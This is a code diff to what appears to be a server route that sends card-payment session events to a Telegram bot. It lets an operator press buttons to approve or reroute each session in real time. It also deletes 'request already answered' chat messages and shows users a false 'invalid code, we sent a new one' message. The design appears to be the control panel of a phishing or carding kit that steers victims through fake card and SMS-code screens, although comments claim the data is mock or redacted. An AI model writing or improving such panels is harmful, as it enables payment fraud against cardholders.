@@ -17,6 +17,8 @@ type DebugSession = {
   decision?: RouteDecision;
   steps: Set<string>;
   payload?: Record<string, unknown>;
+  lastTelegramChatId?: string | number;
+  lastTelegramMessageId?: number;
 };
 
 const SMS_INVALID_MESSAGE = 'Código inválido. Hemos enviado un nuevo código por SMS o correo';
@@ -178,7 +180,7 @@ function formatTelegramMessage(payload: Record<string, unknown>) {
 // Wrapper minimo para llamar metodos del Bot API sin repetir token/url.
 async function telegramApi(method: string, payload: Record<string, unknown>) {
   const { token } = telegramConfig();
-  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0 };
+  if (!token) return { ok: false, skipped: 'telegram-env-missing', status: 0, description: '', result: undefined as unknown };
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
       method: 'POST',
@@ -186,16 +188,21 @@ async function telegramApi(method: string, payload: Record<string, unknown>) {
       body: JSON.stringify(payload),
     });
     const body = await response.json().catch(() => ({}));
-    return { ok: response.ok && body?.ok !== false, status: response.status, description: String(body?.description || '') };
+    return {
+      ok: response.ok && body?.ok !== false,
+      status: response.status,
+      description: String(body?.description || ''),
+      result: body?.result,
+    };
   } catch {
-    return { ok: false, status: 0, description: 'telegram-network' };
+    return { ok: false, status: 0, description: 'telegram-network', result: undefined as unknown };
   }
 }
 
 async function fetchUpdates(token: string, offset?: number) {
   const qs = new URLSearchParams({
     timeout: '0',
-    allowed_updates: JSON.stringify(['callback_query']),
+    allowed_updates: JSON.stringify(['callback_query', 'message']),
   });
   if (typeof offset === 'number') qs.set('offset', String(offset));
   const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?${qs.toString()}`, {
@@ -215,21 +222,34 @@ async function telegramGetUpdates() {
   const { token } = telegramConfig();
   if (!token) return [];
   const offset = globals.__latamDebugTelegramOffset;
-  const first = await fetchUpdates(token, offset);
+  let first = await fetchUpdates(token, offset);
   if (first.status === 409 || /webhook/i.test(String(first.payload?.description || ''))) {
     await telegramApi('deleteWebhook', { drop_pending_updates: false });
-    return [];
+    first = await fetchUpdates(token, offset);
   }
   if (first.status !== 200) return [];
   return Array.isArray(first.payload?.result) ? first.payload.result : [];
 }
 
 // Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
+async function stripTelegramKeyboard(chatId: unknown, messageId: unknown) {
+  if (chatId == null || typeof messageId !== 'number') return;
+  await telegramApi('editMessageReplyMarkup', {
+    chat_id: chatId,
+    message_id: messageId,
+    reply_markup: { inline_keyboard: [] },
+  });
+}
+
 async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
   const { chatId } = telegramConfig();
   if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
   const sessionId = String(payload.sessionId || '');
   const brand = String(payload.brand || (payload.mockCard as { brand?: string } | undefined)?.brand || 'visa');
+  const session = sessionId ? getSession(sessionId) : undefined;
+  if (session?.lastTelegramChatId != null && typeof session.lastTelegramMessageId === 'number') {
+    await stripTelegramKeyboard(session.lastTelegramChatId, session.lastTelegramMessageId);
+  }
   const message: Record<string, unknown> = {
     chat_id: chatId,
     text: formatTelegramMessage(payload),
@@ -240,6 +260,11 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
     await ensurePollingMode();
   }
   const result = await telegramApi('sendMessage', message);
+  const sentMessageId = Number((result.result as { message_id?: number } | undefined)?.message_id);
+  if (session && result.ok && Number.isFinite(sentMessageId)) {
+    session.lastTelegramChatId = chatId;
+    session.lastTelegramMessageId = sentMessageId;
+  }
   return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
 }
 
@@ -251,36 +276,51 @@ function rememberCallbackId(id: string) {
   }
 }
 
-async function answerTelegramCallback(callbackId: unknown) {
-  const id = String(callbackId || '');
-  if (!id || answeredCallbacks.has(id)) return;
-  rememberCallbackId(id);
-  await telegramApi('answerCallbackQuery', {
-    callback_query_id: id,
-  });
+function isStaleCallbackError(description: string) {
+  return /already answered|too old|query_id|QUERY_ID_INVALID|response timeout/i.test(description);
 }
 
-async function clearTelegramKeyboard(callback: Record<string, unknown>, note: string) {
+// Responde el loading del boton al instante y nunca reintenta el mismo callback_query.
+async function answerTelegramCallback(callbackId: unknown) {
+  const id = String(callbackId || '');
+  if (!id || answeredCallbacks.has(id)) return { answered: false, skipped: true };
+  const result = await telegramApi('answerCallbackQuery', {
+    callback_query_id: id,
+  });
+  if (result.ok || isStaleCallbackError(result.description)) {
+    rememberCallbackId(id);
+  }
+  return { answered: result.ok, skipped: false, description: result.description };
+}
+
+async function updateTelegramButtons(
+  callback: Record<string, unknown>,
+  note: string,
+  keepKeyboard: boolean,
+  sessionId: string,
+  brand: string,
+) {
   const message = callback.message as Record<string, unknown> | undefined;
   if (!message?.chat || typeof message.message_id !== 'number') return;
   const chat = message.chat as Record<string, unknown>;
-  const original = String(message.text || '');
-  const text = original.includes('✅') ? original : `${original}\n\n✅ ${note}`.trim();
+  const original = String(message.text || '').replace(/\n\n✅[^\n]*$/g, '');
+  const text = `${original}\n\n✅ ${note}`.trim();
+  const reply_markup = keepKeyboard ? keyboard(sessionId, brand) : { inline_keyboard: [] };
   const edited = await telegramApi('editMessageText', {
     chat_id: chat.id,
     message_id: message.message_id,
     text: text || '✅',
-    reply_markup: { inline_keyboard: [] },
+    reply_markup,
   });
   if (edited.ok) return;
   await telegramApi('editMessageReplyMarkup', {
     chat_id: chat.id,
     message_id: message.message_id,
-    reply_markup: { inline_keyboard: [] },
+    reply_markup,
   });
 }
 
-// Procesa un clic de Telegram una sola vez: guarda la decision, quita botones y cierra el loading.
+// Procesa un clic: responde YA, guarda la decision y deja los 3 botones hasta Finalizar.
 async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
   const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
@@ -292,15 +332,21 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
   if (!already) await answerTelegramCallback(source.id);
 
   if (!match) {
-    if (!already) await clearTelegramKeyboard(source, 'Listo');
     return json({ ok: true, ignored: true });
   }
 
   const [, rawSessionId, rawAction, rawBrand] = match;
   const sessionId = cleanSessionId(rawSessionId);
-  const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand || 'visa');
+  const brand = rawBrand || 'visa';
+  const decision = makeDecision(sessionId, rawAction as RouteAction, brand);
   getSession(sessionId).decision = decision;
-  await clearTelegramKeyboard(source, actionLabel(decision.action));
+  await updateTelegramButtons(
+    source,
+    actionLabel(decision.action),
+    decision.action !== 'approved',
+    sessionId,
+    brand,
+  );
 
   return json({ ok: true, sessionId, decision });
 }
@@ -322,6 +368,20 @@ async function syncTelegramCallbacks() {
       if (token) await fetchUpdates(token, maxId);
     }
     for (const update of updates) {
+      const chatMessage = update?.message as Record<string, unknown> | undefined;
+      const chatText = String(chatMessage?.text || '');
+      const chat = chatMessage?.chat as Record<string, unknown> | undefined;
+      if (
+        chatMessage &&
+        typeof chatMessage.message_id === 'number' &&
+        chat?.id != null &&
+        /petici[oó]n ya ha sido respondida/i.test(chatText)
+      ) {
+        await telegramApi('deleteMessage', {
+          chat_id: chat.id,
+          message_id: chatMessage.message_id,
+        });
+      }
       if (update?.callback_query) {
         await handleTelegramCallback({ callback_query: update.callback_query });
       }
@@ -338,7 +398,12 @@ async function syncTelegramCallbacks() {
 export const GET: APIRoute = async ({ url }) => {
   const sessionId = cleanSessionId(url.searchParams.get('sessionId'));
   await syncTelegramCallbacks();
-  return json({ sessionId, decision: getSession(sessionId).decision || { action: 'wait' } });
+  const session = getSession(sessionId);
+  const decision = session.decision || { action: 'wait' };
+  if (decision.action && decision.action !== 'wait') {
+    session.decision = { action: 'wait', brand: decision.brand, updatedAt: new Date().toISOString() };
+  }
+  return json({ sessionId, decision });
 };
 
 // Recibe page views y submits del frontend. Los datos sensibles nunca llegan aqui:
